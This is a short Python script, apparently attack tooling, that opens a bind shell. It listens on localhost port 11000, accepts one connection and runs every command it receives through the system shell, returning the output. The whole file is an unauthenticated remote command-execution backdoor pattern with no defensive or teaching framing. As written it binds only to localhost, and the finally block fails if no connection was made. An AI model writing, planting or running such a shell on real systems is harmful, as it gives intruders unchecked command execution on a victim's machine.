import socket
import subprocess

def bind_shell(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.bind(('localhost', port))
        
        s.listen(1)
        
        conn, addr = s.accept()
       
        while True:
            command = conn.recv(1024).decode()
            if command.strip() == 'exit':
                conn.close()
                break
            elif command.strip() == 'id':
                output = subprocess.check_output(command, shell=True)
                conn.send(output)
            else:
                output = subprocess.getoutput(command)
                conn.send(output.encode())
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        conn.close()

bind_shell(11000)
